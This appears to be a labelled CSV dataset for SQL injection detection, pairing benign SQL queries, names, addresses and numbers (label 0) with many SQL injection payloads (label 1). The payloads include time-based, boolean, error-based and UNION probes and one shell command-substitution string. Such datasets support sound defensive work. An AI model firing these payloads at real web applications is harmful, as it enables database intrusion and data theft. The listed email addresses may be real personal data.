Query,Label
SELECT AVG ( recognize ) FROM quiet,0
1' where 9003  =  9003 waitfor delay '0:0:5'--,1
5exas9labo,0
"1""  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
having,1
"  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",1
SELECT seldom ( s ) FROM anywhere INNER JOIN,0
karla,0
kawahara,0
SELECT * FROM slow FETCH FIRST 50 PERCENT ROWS ONLY,0
"1""  )   and 7533  =  7533 and   (  ""yqzq""  =  ""yqzq",1
SELECT * FROM zipper  WHERE mix = pitch,0
"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
SELECT atmosphere ( s FROM thread RIGHT JOIN,0
SELECT AVG ( truck ) FROM space,0
SELECT * FROM color WHERE also = 'parallel',0
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1
1.3438E+15,0
SELECT * FROM breathing WHERE dropped NOT LIKE 'bottom%',0
"  SELECT softlyID AS ID, understanding AS discussion FROM type",0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
SELECT * FROM inch WHERE five = 'strike' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( youth )  FROM hide,0
SELECT * FROM shine FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM agree,0
SELECT * FROM wp_posts WHERE ID  =  262311 LIMIT 1,0
"1%""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM amount WHERE but = 'greater' FETCH FIRST 3 ROWS ONLY,0
coe,0
SELECT * FROM Customers LIMIT 3;,0
1.4996E+15,0
goth,0
SELECT * FROM attack WHERE unless = 'task' LIMIT 3,0
SELECT * FROM prove ORDER BY noun,0
"dos aceras 119,",0
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',0
parke konstituzio 128 2?b,0
SELECT TOP 3 * FROM before,0
SELECT TOP 50 PERCENT * FROM aware,0
"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc",1
2.78171E+15,0
SELECT * FROM say WHERE triangle BETWEEN '1996-07-01' AND '1996-07-31',0
-4219' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  8126  =  8126",1
SELECT * FROM driver,0
select sleep  (  5  )   and    (    (   '%'  =  ',1
select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,1
"   SELECT strength, fox, pencil FROM trace WHERE hit  IS NULL",0
cap!tar,0
SELECT AVG ( buy ) FROM equally SELECT SUM ( interior ) ,0
SELECT * FROM dirty WHERE listen BETWEEN 'trick' AND 'ordinary',0
gldar,0
"  SELECT * FROM passage WHERE length IN  ( 'bare', 'final', 'off' )  ",0
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
-8878' in boolean mode  )   union all select 7785#,1
"1%""   )    )     )   and 3116  =  9088#",1
1 where 7442  =  7442,1
" select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",1
SELECT COUNT ( DISTINCT dry )  FROM sister,0
toba,0
SELECT * FROM  ( SELECT weak FROM breakfast ) ,0
1  )   as selm where 5759  =  5759,1
1'  )   as uaoz where 2464  =  2464,1
8.58629E+14,0
SELECT Count ( * )  AS cause,0
a',1
SELECT its FROM deal,0
"SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date ASC LIMIT 0, 2",0
10263,0
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1
patten,0
nanjar viejo,0
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",1
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
tuneu,0
"calle fermin caballero, 103, 10h",0
minter@ac-activos.sk,0
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
4a6050,0
henry@sms24h.tr,0
" SELECT column_name ( s )  FROM describe,came",0
depredador,0
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe",1
37329,0
1   )    )    as rcbz where 4563  =  4563 and 2006  =  2006,1
SELECT eleven ( s FROM nothing RIGHT JOIN,0
SELECT TOP 3 * FROM softly,0
"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
82768054r,0
1  )   as nmlm where 9872  =  9872,1
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
"1""   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""fkip""  =  ""fkip",1
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
6.4255E+15,0
" SELECT * FROM label ORDER BY rocket, particularly",0
SELECT * FROM wp_posts WHERE ID  =  262331 LIMIT 1,0
SELECT * FROM call,0
"  SELECT dangerous,thin,leaving FROM cow LEFT JOIN Orders ON chamber.wireID =  coast.needle ORDER BY eat.could",0
14100,0
38948590e,0
"  SELECT   COALESCE ( NULL, 1, 2, 'W3Schools.com' ) ;",0
"1 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- zozj",1
-9660   )    )    or 9762  =  9698,1
"-3666""   )    )     )   union all select 4136,4136,4136--",1
"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
37170,0
ron,0
SELECT * FROM modern 3,0
m86uca,0
"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",1
"-6662""   )    )    union all select 6755--",1
1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
caada del hoyo,0
andrs castanyer,0
zahn,0
latin,0
"-9011""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",1
"-9953'||  (  select 'zljk' where 2886  =  2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",1
SELECT cattle FROM look UNION SELECT adjective FROM piano ORDER BY family,0
"-6194"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_3142' LIMIT 1,0
prdica,0
"-4637' union all select 9361,9361,9361,9361,9361,9361,9361,9361#",1
"  SELECT * FROM shirt WHERE contrast NOT IN  ( 'got', 'receive', 'riding' )  ",0
"c/ barriada nueva andalucia, 79, 5?f",0
SELECT * FROM having 3,0
hervs bediaga,0
"INSERT INTO increase ( company, college, introduced, rain, metal, mood )  VALUES  ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )  ",0
86m-bra,0
17120,0
"1' where 4860  =  4860 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM shorter FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cast,0
"   SELECT glad, saddle, grandmotherFROM various WHERE pet  IS NOT NULL",0
"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1
3953,0
paolo,0
SELECT garage ( s )  FROM inside SELECT research FROM secret,0
SELECT * FROM onto WHERE equally = 'square'  AND  ( guess = 'snake' OR break = 'bare' ) ,0
SELECT * FROM either WHERE shinning = 'up'  OR ear = 'metal',0
pia rusch,0
"calle alfred nobel, 42 7-g",0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
"-2916""   )    )    or 4946  =  8232--",1
SELECT * FROM doll WHERE paragraph IN  ( SELECT seems FROM like ) ,0
SELECT TOP 50 PERCENT * FROM remember,0
" select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1",1
SELECT COUNT ( problemID ) FROM pound,0
amorebieta-etxano,0
SELECT * FROM grew WHERE lion = 'diameter'  OR attempt = 'broken',0
"errekerte 113,",0
"sierra de la estrella, 86,",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_text' LIMIT 1,0
6287,0
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot',0
SELECT TOP 50 PERCENT * FROM read SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM beyond,0
SELECT * FROM sun  WHERE me NOT LIKE '[mental]%',0
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1' and 5835  =  6157 and 'bjee' like 'bjee,1
pascuet landivar,0
"-7084  )   where 2260  =  2260 or elt  (  1032  =  1032,3623  )  --",1
" SELECT * FROM split ORDER BY various, shoulder",0
"  SELECT * FROM strike WHERE science NOT IN  ( 'nuts', 'suggest', 'join' )  ",0
select   (  case when   (  5390  =  7419  )   then 5390 else 5390*  (  select 5390 from mysql.db  )   end  )  #,1
lesaca clar,0
"   SELECT Employees.vowel, COUNT ( Orders.batID )  AS engineFROM    ( OrdersINNER JOIN beauty ON Orders.tillID  =  Employees.pitchID ) ",0
FROM  ( SELECT DISTINCT tongue FROM settle ) ,0
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",1
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",1
SELECT * FROM studied WHERE discuss = 'free' FETCH FIRST 3 ROWS ONLY,0
"INSERT INTO unless ( by, chair, letter, porch, came, ready )  VALUES  ( 'lost', 'cause'. happy', 'swung', 'detail', 'being', 'needed' )  ",0
"INSERT INTO steady  ( harder, football, needs )  VALUES  ( 'troops', 'her', 'feed' )  ",0
SELECT * FROM surface WHERE trap = 'iron',0
"-7845' union all select 9574,9574,9574,9574,9574,9574#",1
" SELECT * FROM correct ORDER BY hand ASC, church DESC",0
SELECT * FROM solve WHERE habit = 'situation',0
" SELECT * FROM laugh ORDER BY until ASC, grandmother DESC",0
SELECT * FROM couple WHERE try = 'pupil'  OR body = 'orbit',0
"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1
"1"" where 4597  =  4597 rlike sleep  (  5  )  --",1
abieldar,0
"   SELECT shot,bigger,needed,population,beyond     (  (  forth JOIN discuss ON thrown.number =  trouble.produce )   INNER JOIN indicateON Orders.arrive =  neck.unusualID ) ",0
"1""  )   as vdim where 1296  =  1296",1
SELECT * FROM  ( SELECT birds FROM attached ) ,0
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",1
SELECT AVG ( Price ) FROM stone,0
/**/or/**/1/**/  =  /**/1,1
"  SELECT level,aid,voyage FROM hidden LEFT JOIN Orders ON age.cannotID =  accept.work ORDER BY outside.train",0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx",1
SELECT clear FROM heading UNION ALL SELECT brought FROM quietly ORDER BY far,0
SELECT * FROM flies ORDER BY voice DESC,0
SELECT * FROM dark FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM alive WHERE brief  BETWEEN 10 AND 20,0
"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",1
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
nahuel,0
6.52922E+15,0
"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",1
SELECT * FROM map  WHERE depth = leather,0
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1
SELECT * FROM property WHERE save = 'condition',0
"1""  )   union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM direction WHERE careful NOT BETWEEN 'somebody' AND 'definition',0
SELECT COUNT ( pick ) FROM guard,0
SELECT * FROM quick WHERE essential = 'grabbed' LIMIT 3,0
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
"1""   )    )    as wwqj where 3249  =  3249 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
minardi cardea,0
borque clua,0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",1
SELECT * FROM rhythm WHERE strength = 'widely'  AND City = 'supply',0
masferr massans,0
"  SELECT Orders.obtainrID, Employees.curious, Employees.nodded FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dieID ORDER BY Orders.sickID",0
SELECT * FROM company WHERE center  BETWEEN 10 AND 20,0
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,1
SELECT COUNT ( luck ) FROM off,0
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT rising ( s )  FROM condition SELECT development ( s ) ,0
SELECT * FROM lesson WHERE return NOT BETWEEN 'bright' AND 'beginning',0
breanne,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",1
-3422%'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1
SELECT TOP 3 * FROM volume,0
FROM  ( SELECT DISTINCT basket FROM usual ) ,0
SELECT TOP 3 * FROM ask WHERE body = 'clearly' SELECT * FROM donkey,0
SELECT * FROM slip WHERE captured = 'locate' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM noise,0
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",1
SELECT TOP 3 * FROM same,0
pamente,0
requisitorio,0
SELECT * FROM known WHERE layers = 'opinion'  OR arrange = 'fed',0
"juan de salcedo, 158 5?f",0
"   SELECT engineer, shown, scientist FROM physical WHERE exclaimed  IS NULL",0
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
1 where 4245  =  4245,1
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1
" SELECT column_name ( s )  FROM show,solve",0
SELECT * FROM barn WHERE express BETWEEN 'original' AND 'bit',0
1157,0
"1""   )    )     )  ",1
end and   (  'rlux' like 'rlux,1
"   SELECT COUNT ( whispered ) , immediately FROM word BY thousand",0
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
SELECT alive ( s ) FROM gulf INNER JOIN,0
"  SELECT MONTHNAME ( ""2017-06-15"" ) ;",0
"plza. gazteluzarra, 105 7?b",0
SELECT volume ( s ) FROM girl INNER JOIN,0
"  SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )  ",0
SELECT * FROM golden WHERE plus NOT BETWEEN 'sister' AND 'ship',0
frerichs@underdog.as,0
"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",1
con10e4t2,0
$  (  sleep 50  ) ,1
7.05E+15,0
select   (  case when   (  1743  =  5698  )   then 1743 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
ofere*nte,0
"  SELECT * FROM uncle WHERE bound IN  ( 'end', 'tea', 'feel' )  ",0
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
rohan,0
" SELECT * FROM swept ORDER BY beginning, including",0
SELECT size ( s ) FROM skill INNER JOIN,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_number_of_preferred_partners' LIMIT 1,0
1'||  (  select 'gbyh' from dual where 5889  =  5889 order by 1#,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""yzjl"" like ""yzjl",1
garabatos,0
SELECT COUNT ( social ) FROM young,0
SELECT COUNT ( jack ) FROM failed,0
SELECT DISTINCT free FROM them,0
"  SELECT fix AS past, morning AS [recognize]  FROM tape",0
" SELECT * FROM managed ORDER BY official, air",0
SELECT * FROM meant  WHERE post NOT LIKE '[hour]%',0
SELECT * FROM stepped WHERE broken BETWEEN '1996-07-01' AND '1996-07-31',0
fogars de la selva,0
"1%""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1
" select sleep  (  5  )   and ""%""  =  """,1
2246,0
80819303v,0
SELECT amount FROM equipment UNION SELECT sides FROM whose ORDER BY advice,0
"1  )   union all select null,null,null,null,null,null#",1
"   SELECT hot, sometime, bareFROM earn WHERE touch  IS NOT NULL",0
31640,0
drop-box,0
"  UPDATE very SET anywhere =  'pressure', City =  'couple' WHERE pay =  but",0
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,0
SELECT * FROM bread,0
SELECT * FROM art WHERE duty = 'glass'  AND  ( my = 'nervous' OR least = 'in' ) ,0
-6567'   )    )    union all select 3217#,1
select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,1
SELECT COUNT ( cold )  FROM frame,0
SELECT COUNT ( dance )  FROM slowly,0
"  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  9815,9815,case when   (  9815  =  9815  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1
rudie@deuxmanagement.jo,0
SELECT * FROM attached WHERE Price NOT BETWEEN 10 AND 20,0
clariana de cardener,0
garde3@gay-tantra.kw,0
"  SELECT child AS seen, nobody AS [needs]  FROM make",0
SELECT * FROM mouth WHERE    NOT current = 'hall',0
SELECT TOP 50 PERCENT * FROM perfect,0
"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1
DELETE FROM behavior WHERE brain = 'unhappy',0
"   SELECT COUNT ( means ) , tent FROM cause BY make",0
77714009e,0
"-8588' union all select 2135,2135--",1
"1""   )    )    as osuh where 8809  =  8809",1
SELECT * FROM invented WHERE speech BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT usually,0
1'   )    )    as iipj where 6560  =  6560,1
SELECT TOP 3 * FROM sense WHERE rhythm = 'average' SELECT * FROM meet,0
SELECT * FROM pack FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM furniture,0
"1%""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""%""  =  """,1
-2793'  )   where 2621  =  2621 union all select 2621#,1
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1
1'   )    )    as dqby where 9256  =  9256,1
50619,0
SELECT * FROM flag WHERE thrown = 'hour'  AND  ( heart = 'spell' OR open = 'massage' ) ,0
egido s/n,0
25186,0
22193,0
SELECT * FROM tin FETCH FIRST 50 PERCENT ROWS ONLY,0
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
resquebrar,0
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
SELECT Count ( * )  AS dried,0
2.84001E+15,0
 or 3  =  3 --,1
"1"" and 5205  =  9975#",1
"1%"" rlike sleep  (  5  )  #",1
"1""   )    )     )   union all select null,null,null,null,null#",1
-7209'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'stqx'  =  'stqx,1
" select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",1
SELECT * FROM planet,0
SELECT * FROM college WHERE pink = 'piece'  AND  ( each = 'cause' OR divide = 'rather' ) ,0
1%'   )    )    or sleep  (  5  )  #,1
SELECT AVG ( noon ) FROM finger,0
select   (  case when   (  4572  =  4086  )   then 1 else 4572*  (  select 4572 from master..sysdatabases  )   end  )  --,1
"1%""   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""%""  =  """,1
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",1
SELECT * FROM [Brazil Customers]; CREATE OR REPLACE VIEW [Brazil Customers] AS,0
SELECT * FROM shirt WHERE recognize LIKE '%cover%',0
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0
"avinguda carrilet, 21,",0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1
collado mediano,0
SELECT MIN ( damage )  AS won FROM sea,0
"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",1
SELECT * FROM tail WHERE herd = 'sun'  AND  ( film = 'entirely' OR become = 'sport' ) ,0
SELECT TOP 3 * FROM consist WHERE lunch = 'period',0
"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""rvub"" like ""rvub",1
SELECT COUNT ( DISTINCT expect )  FROM substance,0
"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
SELECT great ( s )  FROM slow FULL OUTER JOIN,0
SELECT * FROM molecular WHERE porch NOT LIKE 'local%',0
